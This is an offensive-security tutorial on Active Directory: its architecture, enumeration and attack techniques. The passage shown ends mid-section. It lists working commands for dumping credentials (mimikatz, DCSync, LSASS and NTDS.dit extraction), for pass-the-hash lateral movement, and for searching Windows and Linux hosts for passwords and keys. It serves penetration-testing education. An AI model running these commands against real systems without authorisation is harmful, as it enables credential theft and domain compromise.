---
cover: ../.gitbook/assets/image.jpg
coverY: 0
layout:
  width: default
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Attacking Active Directory (AD)

### Overview

This comprehensive guide covers Active Directory architecture, enumeration, and attack techniques. Understanding these concepts is essential for both offensive security assessments and defensive operations.

***

### Learning Workflow

**Phase 1: Foundations** — AD architecture, domains, forests, trusts\
**Phase 2: Objects** — Users, groups, computers, services\
**Phase 3: Infrastructure** — Database, address resolution, protocols\
**Phase 4: Authentication** — NTLM, Kerberos, delegation\
**Phase 5: Authorisation** — ACLs, privileges, Group Policy

***

## What is Active Directory?

Active Directory (AD) is Microsoft's directory service for Windows domain networks. It stores information about network objects (users, computers, groups, services) and provides authentication and authorisation services.

**Core Components:**

* **Directory Service (AD DS)**: Stores and manages objects
* **Authentication**: Validates user/computer identity (Kerberos, NTLM)
* **Authorisation**: Determines access rights (ACLs, Group Policy)
* **Replication**: Synchronises data across Domain Controllers
* **DNS Integration**: Name resolution for AD services

**Why Attackers Target AD:**

* Centralised authentication = single point of compromise
* Credential caching enables lateral movement
* Trust relationships extend the attack surface
* Misconfigurations are common and exploitable
* Domain Admin = complete network control

***

## Domains

A **domain** is the core administrative unit in Active Directory—a logical grouping of objects (users, computers, groups) that share a common directory database, security policies, and trust relationships.

### Domain Name

Domains have two naming conventions:

| Type         | Example            | Usage                           |
| ------------ | ------------------ | ------------------------------- |
| DNS Name     | `corp.contoso.com` | Network communication, Kerberos |
| NetBIOS Name | `CORP`             | Legacy compatibility, NTLM      |

```powershell
# Get current domain info
Get-ADDomain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Get domain SID
(Get-ADDomain).DomainSID

# Get domain controllers
Get-ADDomainController -Filter *
```

**Domain Components:**

* Domain Controllers (DCs): Host AD DS, handle authentication
* Member Servers: Domain-joined but don't run AD DS
* Workstations: Domain-joined client computers
* Organisational Units (OUs): Containers for organising objects

***

## Forests

A **forest** is the top-level container in AD—a collection of one or more domains that share a standard schema, configuration, and Global Catalogue—all domains in a forest trust each other (transitive trust).

```bash
Forest: contoso.com
├── Domain: contoso.com (forest root domain)
├── Domain: corp.contoso.com (child domain)
├── Domain: eu.contoso.com (child domain)
└── Domain: partner.local (tree root - different namespace)
```

**Forest Components:**

* **Schema**: Defines object classes and attributes (forest-wide)
* **Configuration**: Forest topology, sites, services
* **Global Catalogue**: Partial replica of all domain objects
* **Forest Root Domain**: First domain created, contains Enterprise Admins

### Functional Modes

Functional levels determine which AD features are available and which DC versions are supported.

#### Forest Functional Levels

<table><thead><tr><th width="177">Level</th><th width="246">Minimum DC OS</th><th>Key Features</th></tr></thead><tbody><tr><td>Windows 2000</td><td>Windows 2000</td><td>Basic AD</td></tr><tr><td>Windows 2003</td><td>Windows Server 2003</td><td>Forest trusts, linked-value replication</td></tr><tr><td>Windows 2008</td><td>Windows Server 2008</td><td>DFS-R for SYSVOL</td></tr><tr><td>Windows 2008 R2</td><td>Windows Server 2008 R2</td><td>AD Recycle Bin</td></tr><tr><td>Windows 2012</td><td>Windows Server 2012</td><td>-</td></tr><tr><td>Windows 2012 R2</td><td>Windows Server 2012 R2</td><td>Authentication policies</td></tr><tr><td>Windows 2016</td><td>Windows Server 2016</td><td>Privileged Access Management</td></tr></tbody></table>

#### Domain Functional Levels

<table><thead><tr><th width="263">Level</th><th>Key Features</th></tr></thead><tbody><tr><td>Windows 2000 Native</td><td>Universal groups, group nesting</td></tr><tr><td>Windows 2003</td><td><code>lastLogonTimestamp</code>, constrained delegation</td></tr><tr><td>Windows 2008</td><td>AES Kerberos, fine-grained password policies</td></tr><tr><td>Windows 2008 R2</td><td>Authentication mechanism assurance</td></tr><tr><td>Windows 2012</td><td>KDC support for claims</td></tr><tr><td>Windows 2012 R2</td><td>Protected Users group, authentication policies</td></tr><tr><td>Windows 2016</td><td>Smart card required for interactive logon</td></tr></tbody></table>

```powershell
# Check functional levels
(Get-ADForest).ForestMode
(Get-ADDomain).DomainMode
```

***

## Trusts

Trusts enable users in one domain to access resources in another domain. They define authentication pathways between domains.

### Trust Direction

<table><thead><tr><th width="194">Direction</th><th>Description</th><th>Authentication Flow</th></tr></thead><tbody><tr><td><strong>One-way incoming</strong></td><td>Trusting domain trusts trusted domain</td><td>Users from trusted → access trusting</td></tr><tr><td><strong>One-way outgoing</strong></td><td>Trusted domain is trusted by trusting domain</td><td>Users from this domain → access other</td></tr><tr><td><strong>Two-way</strong></td><td>Bidirectional trust</td><td>Users can authenticate in either direction</td></tr></tbody></table>

```bash
Domain A ----trusts----> Domain B (One-way)
Users in B can access resources in A
A is the "trusting" domain
B is the "trusted" domain
```

### Trust Transitivity

<table><thead><tr><th width="152">Type</th><th>Description</th></tr></thead><tbody><tr><td><strong>Transitive</strong></td><td>Trust extends to other trusted domains (A trusts B, B trusts C → A trusts C)</td></tr><tr><td><strong>Non-transitive</strong></td><td>Trust limited to the two domains only</td></tr></tbody></table>

### Trust Types

<table><thead><tr><th width="126">Trust Type</th><th width="145">Direction</th><th width="140">Transitivity</th><th>Description</th></tr></thead><tbody><tr><td><strong>Parent-Child</strong></td><td>Two-way</td><td>Transitive</td><td>Automatic between parent and child domains</td></tr><tr><td><strong>Tree-Root</strong></td><td>Two-way</td><td>Transitive</td><td>Between forest root and new tree root</td></tr><tr><td><strong>Shortcut</strong></td><td>One/Two-way</td><td>Transitive</td><td>Optimize authentication in large forests</td></tr><tr><td><strong>External</strong></td><td>One/Two-way</td><td>Non-transitive</td><td>To external AD domain (non-forest)</td></tr><tr><td><strong>Forest</strong></td><td>One/Two-way</td><td>Transitive</td><td>Between forest root domains</td></tr><tr><td><strong>Realm</strong></td><td>One/Two-way</td><td>Transitive/Non</td><td>To non-Windows Kerberos realm</td></tr></tbody></table>

### Trust Key

Trusts are secured with a shared secret (trust key) used to encrypt inter-realm TGTs.

* Stored as a trust account password in both domains
* Used to generate Kerberos keys for cross-domain tickets
* Compromising trust keys enables golden ticket attacks across domains

```powershell
# Enumerate trusts
Get-ADTrust -Filter *
nltest /domain_trusts /all_trusts

# Get trust details
Get-ADTrust -Identity "partner.local" | Select-Object *
```

### More on Trusts

#### Trust Enumeration for Attacks

```powershell
# PowerView
Get-DomainTrust
Get-ForestTrust
Get-DomainTrustMapping

# BloodHound collection includes trust data
SharpHound.exe -c All
```

#### Trust Attack Paths

1. **SID History Injection**: Inject privileged SIDs from a trusted domain
2. **Foreign Group Membership**: Users from a trusted domain in privileged groups
3. **Trust Key Extraction**: DCSync/mimikatz to get trust account hash
4. **Kerberos Ticket Forgery**: Golden tickets with cross-domain SIDs

***

## Users

User objects represent security principals that can authenticate to the domain.

### User Properties

#### User Identifiers

<table><thead><tr><th width="183">Identifier</th><th width="269">Description</th><th>Example</th></tr></thead><tbody><tr><td><strong>SID</strong></td><td>Security Identifier (unique, permanent)</td><td><code>S-1-5-21-....-1104</code></td></tr><tr><td><strong>sAMAccountName</strong></td><td>Pre-Windows 2000 logon name</td><td><code>jsmith</code></td></tr><tr><td><strong>userPrincipalName</strong></td><td>UPN format</td><td><code>jsmith@corp.contoso.com</code></td></tr><tr><td><strong>distinguishedName</strong></td><td>LDAP path</td><td><code>CN=John Smith,OU=Users,DC=corp,DC=contoso,DC=com</code></td></tr><tr><td><strong>objectGUID</strong></td><td>Globally unique identifier</td><td><code>{GUID}</code></td></tr><tr><td><strong>RID</strong></td><td>Relative ID (last part of SID)</td><td><code>1104</code></td></tr></tbody></table>

```powershell
# Get user identifiers
Get-ADUser -Identity jsmith -Properties *

# Find user by SID
Get-ADUser -Filter {SID -eq "S-1-5-21-....-1104"}
```

#### User Secrets

**LM/NT Hashes**

<table><thead><tr><th width="132">Hash Type</th><th>Description</th><th>Security</th></tr></thead><tbody><tr><td><strong>LM Hash</strong></td><td>Legacy, DES-based, case-insensitive</td><td>Weak, disabled by default (Vista+)</td></tr><tr><td><strong>NT Hash</strong></td><td>MD4 hash of Unicode password</td><td>Better, still no salt</td></tr></tbody></table>

```bash
LM Hash: AAD3B435B51404EEAAD3B435B51404EE (empty/disabled)
NT Hash: 32ED87BDB5FDC5E9CBA88547376818D4
Format: LM:NT or :NT (NTLM hash)
```

**Dumping Hashes:**

```bash
# Mimikatz
sekurlsa::logonpasswords
lsadump::sam
lsadump::dcsync /user:Administrator

# Impacket
secretsdump.py domain/user:password@dc.domain.com
```

**Kerberos Keys**

Derived from user password + salt (domain + username):

| Key Type                    | Encryption  | Usage                |
| --------------------------- | ----------- | -------------------- |
| **AES256-CTS-HMAC-SHA1-96** | AES 256-bit | Modern Kerberos      |
| **AES128-CTS-HMAC-SHA1-96** | AES 128-bit | Modern Kerberos      |
| **RC4-HMAC (arcfour)**      | NT Hash     | Legacy compatibility |
| **DES-CBC-MD5**             | DES         | Very old systems     |

```bash
# Dump Kerberos keys
mimikatz # lsadump::dcsync /user:krbtgt /domain:corp.contoso.com
```

#### UserAccountControl

Bitmask attribute controlling account behaviour.

<table><thead><tr><th>Flag</th><th width="144">Value</th><th>Description</th></tr></thead><tbody><tr><td><code>ACCOUNTDISABLE</code></td><td>0x0002</td><td>Account disabled</td></tr><tr><td><code>LOCKOUT</code></td><td>0x0010</td><td>Account locked</td></tr><tr><td><code>PASSWD_NOTREQD</code></td><td>0x0020</td><td>No password required</td></tr><tr><td><code>PASSWD_CANT_CHANGE</code></td><td>0x0040</td><td>User can't change password</td></tr><tr><td><code>ENCRYPTED_TEXT_PWD_ALLOWED</code></td><td>0x0080</td><td>Reversible encryption</td></tr><tr><td><code>NORMAL_ACCOUNT</code></td><td>0x0200</td><td>Standard user account</td></tr><tr><td><code>DONT_EXPIRE_PASSWORD</code></td><td>0x10000</td><td>Password never expires</td></tr><tr><td><code>TRUSTED_FOR_DELEGATION</code></td><td>0x80000</td><td>Unconstrained delegation</td></tr><tr><td><code>NOT_DELEGATED</code></td><td>0x100000</td><td>Account cannot be delegated</td></tr><tr><td><code>USE_DES_KEY_ONLY</code></td><td>0x200000</td><td>DES encryption only</td></tr><tr><td><code>DONT_REQ_PREAUTH</code></td><td>0x400000</td><td>No Kerberos pre-auth (ASREProastable)</td></tr><tr><td><code>TRUSTED_TO_AUTH_FOR_DELEGATION</code></td><td>0x1000000</td><td>Constrained delegation (S4U2Self)</td></tr></tbody></table>

```powershell
# Find accounts with specific UAC flags
# No pre-auth (ASREProastable)
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}

# Unconstrained delegation
Get-ADUser -Filter {TrustedForDelegation -eq $true}

# Password not required
Get-ADUser -Filter {PasswordNotRequired -eq $true}
```

#### Other User Properties

| Property                                   | Attack Relevance               |
| ------------------------------------------ | ------------------------------ |
| `servicePrincipalName`                     | Kerberoastable if set          |
| `msDS-AllowedToDelegateTo`                 | Constrained delegation targets |
| `msDS-AllowedToActOnBehalfOfOtherIdentity` | RBCD targets                   |
| `adminCount`                               | AdminSDHolder protected        |
| `memberOf`                                 | Group memberships              |
| `pwdLastSet`                               | Password age                   |
| `lastLogon`                                | Activity indicator             |
| `logonCount`                               | Activity indicator             |
| `description`                              | Often contains passwords       |

### Important Users

#### Built-in Privileged Users

<table><thead><tr><th width="156">Account</th><th width="150">RID</th><th>Description</th></tr></thead><tbody><tr><td><strong>Administrator</strong></td><td>500</td><td>Built-in domain admin</td></tr><tr><td><strong>krbtgt</strong></td><td>502</td><td>KDC service account (golden ticket target)</td></tr><tr><td><strong>Guest</strong></td><td>501</td><td>Disabled by default</td></tr></tbody></table>

#### Service Accounts to Target

| Account Type          | Characteristics            | Attack               |
| --------------------- | -------------------------- | -------------------- |
| **Service Accounts**  | SPNs, often weak passwords | Kerberoast           |
| **gMSA**              | Managed passwords          | Harder to compromise |
| **Computer Accounts** | Machine account            | Password in registry |

```powershell
# Find service accounts (accounts with SPNs)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### Computer Accounts

Computer accounts are security principals for domain-joined machines.

**Properties:**

* Name ends with `$` (e.g., `WORKSTATION01$`)
* Password: 120+ character random, auto-rotated every 30 days
* Stored in HKLM\SECURITY\Policy\Secrets$MACHINE.ACC
* SPN: `HOST/computername`, `HOST/computername.domain.com`

{% code overflow="wrap" %}
```powershell
# Enumerate computer accounts
Get-ADComputer -Filter * -Properties *

# Find computers with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# Find computers with constrained delegation
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```
{% endcode %}

### Trust Accounts

Each trust creates a trust account in both domains (named after the trusted domain with `$`).

{% code overflow="wrap" %}
```powershell
# Find trust accounts
Get-ADUser -Filter {Name -like "*$"} -Properties * | Where-Object {$_.UserAccountControl -band 0x820}
```
{% endcode %}

***

## Groups

Groups are collections of users, computers, or other groups used for access control and management.

### Important Groups

#### Administrative Groups

<table><thead><tr><th width="207">Group</th><th width="199">Scope</th><th>Description</th></tr></thead><tbody><tr><td><strong>Domain Admins</strong></td><td>Global</td><td>Full control of domain</td></tr><tr><td><strong>Enterprise Admins</strong></td><td>Universal (forest root)</td><td>Full control of forest</td></tr><tr><td><strong>Schema Admins</strong></td><td>Universal (forest root)</td><td>Can modify AD schema</td></tr><tr><td><strong>Administrators</strong></td><td>Domain Local</td><td>Local admin on DCs</td></tr><tr><td><strong>Account Operators</strong></td><td>Domain Local</td><td>Create/manage users and groups</td></tr><tr><td><strong>Backup Operators</strong></td><td>Domain Local</td><td>Backup/restore files, DCSync potential</td></tr><tr><td><strong>Server Operators</strong></td><td>Domain Local</td><td>Manage domain servers</td></tr><tr><td><strong>Print Operators</strong></td><td>Domain Local</td><td>Manage printers, load drivers</td></tr></tbody></table>

#### Other Important Groups

| Group                            | Description                              |
| -------------------------------- | ---------------------------------------- |
| **Domain Controllers**           | All DCs in domain                        |
| **Domain Computers**             | All workstations                         |
| **Domain Users**                 | All domain users                         |
| **Protected Users**              | Enhanced credential protection           |
| **Group Policy Creator Owners**  | Create/modify GPOs                       |
| **DnsAdmins**                    | DNS management, code execution potential |
| **Remote Desktop Users**         | RDP access                               |
| **Remote Management Users**      | WinRM access                             |
| **Cert Publishers**              | Certificate publishing                   |
| **Exchange Windows Permissions** | Often has WriteDacl on domain            |

```powershell
# Enumerate group members
Get-ADGroupMember -Identity "Domain Admins" -Recursive

# Find nested group memberships
Get-ADPrincipalGroupMembership -Identity jsmith

# Find groups with specific privileges
Get-ADGroup -Filter * -Properties adminCount | Where-Object {$_.adminCount -eq 1}
```

### Group Scope

<table><thead><tr><th width="190">Scope</th><th>Can Contain</th><th>Can Be Used In</th></tr></thead><tbody><tr><td><strong>Domain Local</strong></td><td>Users/groups from any domain</td><td>Same domain only</td></tr><tr><td><strong>Global</strong></td><td>Users/groups from same domain</td><td>Any domain in forest</td></tr><tr><td><strong>Universal</strong></td><td>Users/groups from any domain</td><td>Any domain in forest</td></tr></tbody></table>

***

## Computers

### Domain Controllers

Domain Controllers (DCs) host Active Directory Domain Services and handle authentication requests.

#### Domain Controllers Discovery

{% code overflow="wrap" %}
```bash
# DNS queries
nslookup -type=srv _ldap._tcp.dc._msdcs.domain.com
nslookup -type=srv _kerberos._tcp.domain.com

# LDAP query
ldapsearch -x -H ldap://dc.domain.com -b "dc=domain,dc=com" "(objectClass=computer)" | grep -i "dn:"

# PowerShell
Get-ADDomainController -Filter *
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers

# Nmap
nmap -p 389,636,88,53 192.168.1.0/24

# NetBIOS
nbtscan 192.168.1.0/24
```
{% endcode %}

#### Domain Database Dumping

The AD database (NTDS.dit) contains all domain secrets.

```bash
# DCSync (requires Replicating Directory Changes)
mimikatz # lsadump::dcsync /domain:corp.contoso.com /all /csv
secretsdump.py domain/user:password@dc.domain.com

# Volume Shadow Copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\

# ntdsutil
ntdsutil "activate instance ntds" "ifm" "create full C:\temp" quit quit

# Extract hashes offline
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

### Windows Computers

#### Windows Computers Discovery

```bash
# Network scanning
nmap -sn 192.168.1.0/24
nmap -p 445,135,139 192.168.1.0/24 --open

# LDAP enumeration
Get-ADComputer -Filter {OperatingSystem -like "*Windows*"} -Properties OperatingSystem

# SMB enumeration
crackmapexec smb 192.168.1.0/24

# NetBIOS
nbtscan 192.168.1.0/24

# Ping sweep
fping -a -g 192.168.1.0/24
```

#### Windows Computers Connection

**Connecting with RPC/SMB**

```bash
# PsExec (ADMIN$ share + service creation)
psexec.py domain/user:password@target.domain.com
psexec.exe \\target -u domain\user -p password cmd.exe

# SMBExec (no file drop)
smbexec.py domain/user:password@target.domain.com

# WMIExec (WMI-based)
wmiexec.py domain/user:password@target.domain.com

# ATExec (scheduled task)
atexec.py domain/user:password@target.domain.com "command"

# DCOM Exec
dcomexec.py domain/user:password@target.domain.com

# Pass the hash
psexec.py -hashes :NTHASH domain/user@target.domain.com
crackmapexec smb target -u user -H NTHASH -d domain -x "whoami"
```

**Connecting with PowerShell Remoting**

```powershell
# Enable remoting
Enable-PSRemoting -Force

# Interactive session
Enter-PSSession -ComputerName target.domain.com -Credential domain\user

# Remote command execution
Invoke-Command -ComputerName target.domain.com -ScriptBlock {whoami} -Credential domain\user

# Session-based
$session = New-PSSession -ComputerName target.domain.com -Credential domain\user
Invoke-Command -Session $session -ScriptBlock {whoami}
Enter-PSSession -Session $session
```

```bash
# Evil-WinRM
evil-winrm -i target.domain.com -u user -p password -d domain

# With hash
evil-winrm -i target.domain.com -u user -H NTHASH
```

**Connecting with RDP**

```bash
# Linux
xfreerdp /u:user /p:password /d:domain /v:target.domain.com
rdesktop -u user -p password -d domain target.domain.com

# With hash (Restricted Admin mode required)
xfreerdp /u:user /pth:NTHASH /d:domain /v:target.domain.com

# Windows
mstsc /v:target.domain.com
```

#### Windows Computers Credentials

**LSASS Credentials**

LSASS (Local Security Authority Subsystem Service) caches credentials for SSO.

{% code overflow="wrap" %}
```bash
# Mimikatz
sekurlsa::logonpasswords    # All cached credentials
sekurlsa::wdigest           # WDigest plaintext (if enabled)
sekurlsa::kerberos          # Kerberos tickets
sekurlsa::msv               # NTLM hashes
sekurlsa::credman           # Credential Manager

# Dump LSASS memory
procdump.exe -ma lsass.exe lsass.dmp
comsvcs.dll method: rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> lsass.dmp full

# Process from dump
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# pypykatz (Python)
pypykatz lsa minidump lsass.dmp
```
{% endcode %}

**Registry Credentials**

**LSA Secrets**

Stored in `HKLM\SECURITY\Policy\Secrets`:

* Service account passwords
* Auto-logon credentials
* Machine account password
* DPAPI master keys

```bash
# Mimikatz
lsadump::secrets

# Impacket
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

**SAM**

Local account hashes in `HKLM\SAM`:

```bash
# Mimikatz
lsadump::sam

# Impacket
secretsdump.py -sam SAM -system SYSTEM LOCAL

# Registry extraction
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save
```

**Dumping Registry Credentials**

```bash
# Save registry hives
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
reg save HKLM\SECURITY C:\temp\security

# CrackMapExec
crackmapexec smb target -u user -p password --sam
crackmapexec smb target -u user -p password --lsa
```

**PowerShell History**

{% code overflow="wrap" %}
```powershell
# PSReadLine history location
%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Get history
Get-Content (Get-PSReadLineOption).HistorySavePath

# Search for credentials
Select-String -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Pattern "password|credential|secret"
```
{% endcode %}

**Other Places to Find Credentials in Windows**

| Location                                               | Content                           |
| ------------------------------------------------------ | --------------------------------- |
| `%USERPROFILE%\AppData\Local\Microsoft\Credentials\`   | DPAPI-protected credentials       |
| `%USERPROFILE%\AppData\Roaming\Microsoft\Credentials\` | DPAPI-protected credentials       |
| `C:\Windows\Panther\unattend.xml`                      | Setup credentials                 |
| `C:\Windows\Panther\Unattended.xml`                    | Setup credentials                 |
| `%WINDIR%\sysprep\sysprep.xml`                         | Sysprep credentials               |
| `%WINDIR%\sysprep\sysprep.inf`                         | Sysprep credentials               |
| `C:\inetpub\wwwroot\web.config`                        | Web app credentials               |
| `%USERPROFILE%\.aws\credentials`                       | AWS credentials                   |
| `%USERPROFILE%\.azure\`                                | Azure credentials                 |
| Group Policy Preferences                               | Encrypted (decryptable) passwords |
| Scheduled Tasks                                        | Service account credentials       |
| Windows Vault                                          | Web credentials                   |

```powershell
# Find GPP passwords
findstr /SI /M "cpassword" \\domain.com\sysvol\domain.com\policies\*.xml

# Search for passwords in files
findstr /spin "password" *.txt *.xml *.ini *.config

# Credential Manager
cmdkey /list
vaultcmd /listcreds:"Windows Credentials" /all
```

### Linux Computers

#### Linux Computers Discovery

{% code overflow="wrap" %}
```bash
# Network scanning
nmap -sn 192.168.1.0/24
nmap -p 22,111,2049 192.168.1.0/24 --open

# LDAP enumeration
ldapsearch -x -H ldap://dc.domain.com -b "dc=domain,dc=com" "(&(objectClass=computer)(operatingSystem=*Linux*))"

# From AD
Get-ADComputer -Filter {OperatingSystem -like "*Linux*"} -Properties OperatingSystem
```
{% endcode %}

#### Linux Computers Connection

```bash
# SSH with password
ssh user@target.domain.com

# SSH with key
ssh -i private_key user@target.domain.com

# SSH with Kerberos
kinit user@DOMAIN.COM
ssh -K user@target.domain.com

# SCP file transfer
scp file.txt user@target.domain.com:/tmp/
```

#### Linux Computers Credentials

**Linux Kerberos Tickets**

```bash
# Ticket cache location
echo $KRB5CCNAME
ls -la /tmp/krb5cc_*

# Default locations
/tmp/krb5cc_%{uid}
/var/lib/sss/db/

# Copy ticket for use
export KRB5CCNAME=/tmp/krb5cc_1000

# List tickets
klist

# Keytab locations
/etc/krb5.keytab
~/.k5keytab

# Extract keys from keytab
klist -k /etc/krb5.keytab
```

**Linux User Files**

```bash
# Password hashes
/etc/shadow

# User information
/etc/passwd

# Group information
/etc/group

# Crack shadow hashes
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=rockyou.txt unshadowed.txt
hashcat -m 1800 -a 0 shadow.txt rockyou.txt
```

**SSH Keys**

```bash
# Common locations
~/.ssh/id_rsa
~/.ssh/id_ecdsa
~/.ssh/id_ed25519
~/.ssh/authorized_keys

# Search for keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Extract private keys
cat ~/.ssh/id_rsa
```

**Bash History**

```bash
# History files
~/.bash_history
~/.zsh_history
~/.history

# Search for credentials
grep -E "password|passwd|secret|key|token" ~/.bash_history
history | grep -i pass
```

**Other Places to Find Credentials in Linux**

| Location                  | Content                    |
| ------------------------- | -------------------------- |
| `/etc/sssd/sssd.conf`     | AD integration credentials |
| `/etc/krb5.conf`          | Kerberos configuration     |
| `/etc/samba/smb.conf`     | Samba configuration        |
| `~/.pgpass`               | PostgreSQL credentials     |
| `~/.my.cnf`               | MySQL credentials          |
| `~/.netrc`                | FTP credentials            |
| `~/.aws/credentials`      | AWS credentials            |
| `/var/log/auth.log`       | Authentication attempts    |
| `/etc/openldap/ldap.conf` | LDAP configuration         |
| Environment variables     | API keys, tokens           |

```bash
# Search for credentials in config files
grep -rli "password" /etc/ 2>/dev/null
grep -rli "password" /var/www/ 2>/dev/null
grep -rli "password" /opt/ 2>/dev/null

# Environment variables
env | grep -i pass
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass
```

***

## Services

### Host Service

The HOST SPN is an alias that includes multiple services:

| Service      | Description                      |
| ------------ | -------------------------------- |
| alerter      | Alerter service                  |
| appmgmt      | Application Management           |
| cisvc        | Indexing Service                 |
| clipsrv      | ClipBook                         |
| browser      | Computer Browser                 |
| dhcp         | DHCP Server                      |
| dnscache     | DNS Client                       |
| replicator   | Directory Replicator             |
| eventlog     | Event Log                        |
| eventsystem  | COM+ Event System                |
| policyagent  | IPSec Policy Agent               |
| oakley       | ISAKMP/Oakley                    |
| dmserver     | Logical Disk Manager             |
| messenger    | Messenger                        |
| netman       | Network Connections              |
| nla          | Network Location Awareness       |
| rpc          | Remote Procedure Call            |
| rpclocator   | RPC Locator                      |
| remoteaccess | Routing and Remote Access        |
| rsvp         | RSVP QoS                         |
| samss        | SAM                              |
| scardsvr     | Smart Card                       |
| scesrv       | Security Configuration           |
| seclogon     | Secondary Logon                  |
| scm          | Service Control Manager          |
| dcom         | Server service (DCOM)            |
| spooler      | Print Spooler                    |
| snmp         | SNMP Trap                        |
| schedule     | Task Scheduler                   |
| tapisrv      | Telephony                        |
| trksvr       | Distributed Link Tracking Server |
| trkwks       | Distributed Link Tracking Client |
| ntdsa        | Active Directory                 |
| ups          | UPS                              |
| time         | Windows Time                     |
| wins         | Windows Wins                     |
| www          | IIS                              |

{% code overflow="wrap" %}
```powershell
# Enumerate SPNs
setspn -L computername
Get-ADComputer -Identity computername -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName
```
{% endcode %}

***

## Database

The Active Directory database (NTDS.dit) stores all domain objects using the Extensible Storage Engine (ESE).

### Classes

Object classes define what type of object can be created and what attributes it can have.

| Class                  | Description       | Key Attributes                                      |
| ---------------------- | ----------------- | --------------------------------------------------- |
| `user`                 | User accounts     | `sAMAccountName`, `userPrincipalName`, `unicodePwd` |
| `computer`             | Computer accounts | `dNSHostName`, `operatingSystem`                    |
| `group`                | Security groups   | `member`, `groupType`                               |
| `organizationalUnit`   | Containers        | `gpLink`                                            |
| `domainDNS`            | Domain object     | `objectSid`, `fSMORoleOwner`                        |
| `trustedDomain`        | Trust objects     | `trustDirection`, `trustType`                       |
| `groupPolicyContainer` | GPOs              | `gPCFileSysPath`                                    |

### Properties

Attributes store object information. Key security-relevant attributes:

| Attribute                                  | Object        | Description                |
| ------------------------------------------ | ------------- | -------------------------- |
| `unicodePwd`                               | User          | NT hash (encrypted)        |
| `ntPwdHistory`                             | User          | Password history           |
| `dBCSPwd`                                  | User          | LM hash                    |
| `supplementalCredentials`                  | User          | Kerberos keys              |
| `msDS-AllowedToDelegateTo`                 | User/Computer | Constrained delegation     |
| `msDS-AllowedToActOnBehalfOfOtherIdentity` | Computer      | RBCD                       |
| `userAccountControl`                       | User/Computer | Account flags              |
| `servicePrincipalName`                     | User/Computer | SPNs                       |
| `nTSecurityDescriptor`                     | All           | Security descriptor (ACL)  |
| `adminCount`                               | User/Group    | Protected by AdminSDHolder |

### Principals

Security principals are objects that can be assigned permissions and authenticate.

#### SID

Security Identifier - unique identifier for principals.

```bash
S-1-5-21-3623811015-3361044348-30300820-1013
│ │ │  └──────────────────────────────────┴──── Domain Identifier
│ │ └─────────────────────────────────────────── Authority (5 = NT Authority)
│ └───────────────────────────────────────────── Revision (1)
└─────────────────────────────────────────────── SID indicator
```

**Well-Known SIDs:**

| SID                     | Name                 |
| ----------------------- | -------------------- |
| `S-1-5-21-<domain>-500` | Domain Administrator |
| `S-1-5-21-<domain>-502` | krbtgt               |
| `S-1-5-21-<domain>-512` | Domain Admins        |
| `S-1-5-21-<domain>-513` | Domain Users         |
| `S-1-5-21-<domain>-516` | Domain Controllers   |
| `S-1-5-21-<domain>-519` | Enterprise Admins    |
| `S-1-5-32-544`          | Administrators       |
| `S-1-5-32-545`          | Users                |
| `S-1-5-18`              | Local System         |
| `S-1-5-19`              | Local Service        |
| `S-1-5-20`              | Network Service      |

### Distinguished Names

LDAP path to an object.

```bash
CN=John Smith,OU=Users,OU=Corp,DC=domain,DC=com
│             │        │       └─────────────── Domain Component
│             │        └───────────────────────── Organisational Unit
│             └────────────────────────────────── Organisational Unit
└──────────────────────────────────────────────── Common Name
```

### Partitions

| Partition         | Description                   | Replication       |
| ----------------- | ----------------------------- | ----------------- |
| **Domain**        | Domain-specific objects       | Domain DCs only   |
| **Configuration** | Forest topology, sites        | All DCs in forest |
| **Schema**        | Object definitions            | All DCs in forest |
| **Application**   | Custom partitions (DNS zones) | Configurable      |

### Global Catalog

Partial read-only replica of all objects in the forest (subset of attributes).

* Runs on port 3268 (LDAP) / 3269 (LDAPS)
* Used for forest-wide searches
* Used for UPN authentication
* Contains membership of universal groups

```bash
# Query Global Catalog
ldapsearch -x -H ldap://dc.domain.com:3268 -b "dc=domain,dc=com"
```

### How to Query the Database?

#### LDAP

Lightweight Directory Access Protocol - primary method for AD queries.

**Ports:**

* 389: LDAP
* 636: LDAPS (SSL)
* 3268: Global Catalog
* 3269: Global Catalog SSL

{% code overflow="wrap" %}
```bash
# Anonymous bind (if allowed)
ldapsearch -x -H ldap://dc.domain.com -b "dc=domain,dc=com"

# Authenticated bind
ldapsearch -x -H ldap://dc.domain.com -D "CN=user,CN=Users,DC=domain,DC=com" -w password -b "dc=domain,dc=com"

# Find all users
ldapsearch -x -H ldap://dc.domain.com -D "user@domain.com" -w password -b "dc=domain,dc=com" "(objectClass=user)"

# Find specific user
ldapsearch -x -H ldap://dc.domain.com -D "user@domain.com" -w password -b "dc=domain,dc=com" "(sAMAccountName=jsmith)"

# Find computers
